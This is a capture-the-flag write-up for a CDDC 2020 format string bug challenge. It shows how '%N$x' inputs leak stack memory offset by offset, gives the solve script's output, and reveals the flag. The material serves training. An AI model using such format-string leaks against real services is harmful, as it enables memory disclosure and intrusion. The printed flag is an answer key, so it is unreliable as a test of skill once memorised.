# [Pwn (Linux)-3] Find Singapore Bug
Pwn

## Challenge 

Let's FSB!

fsb.chall.cddc2020.nshc.sg 30303

## Solution

FSB stands for Format String Bug.

If we do "%1$x", we get the hex string at offset 1. Repeat with increasing offsets until we leak the entire string.

	python3 solve.py 
	444443e0
	Progress: 1 b'\xe0CDD'
	7b303243
	Progress: 2 b'\xe0CDDC20{'
	41414141
	Progress: 3 b'\xe0CDDC20{AAAA'
	42424242
	Progress: 4 b'\xe0CDDC20{AAAABBBB'
	7e684f2d
	Progress: 5 b'\xe0CDDC20{AAAABBBB-Oh~'
	4c756f59
	Progress: 6 b'\xe0CDDC20{AAAABBBB-Oh~YouL'
	656b6165
	Progress: 7 b'\xe0CDDC20{AAAABBBB-Oh~YouLeake'
	2d744964
	Progress: 8 b'\xe0CDDC20{AAAABBBB-Oh~YouLeakedIt-'
	43434343
	Progress: 9 b'\xe0CDDC20{AAAABBBB-Oh~YouLeakedIt-CCCC'
	44444444
	Progress: 10 b'\xe0CDDC20{AAAABBBB-Oh~YouLeakedIt-CCCCDDDD'
	3131257d
	Progress: 11 b'\xe0CDDC20{AAAABBBB-Oh~YouLeakedIt-CCCCDDDD}%11'
	ff007824
	Progress: 12 b'\xe0CDDC20{AAAABBBB-Oh~YouLeakedIt-CCCCDDDD}%11$x\x00\xff'
	ffa8aa1c
	Progress: 13 b'\xe0CDDC20{AAAABBBB-Oh~YouLeakedIt-CCCCDDDD}%11$x\x00\xff\x1c\xaa\xa8\xff'
	565cc3c1
	Progress: 14 b'\xe0CDDC20{AAAABBBB-Oh~YouLeakedIt-CCCCDDDD}%11$x\x00\xff\x1c\xaa\xa8\xff\xc1\xc3\\V'
	f7f512d0
	Progress: 15 b'\xe0CDDC20{AAAABBBB-Oh~YouLeakedIt-CCCCDDDD}%11$x\x00\xff\x1c\xaa\xa8\xff\xc1\xc3\\V\xd0\x12\xf5\xf7'
	0

## Flag

	CDDC20{AAAABBBB-Oh~YouLeakedIt-CCCCDDDD}
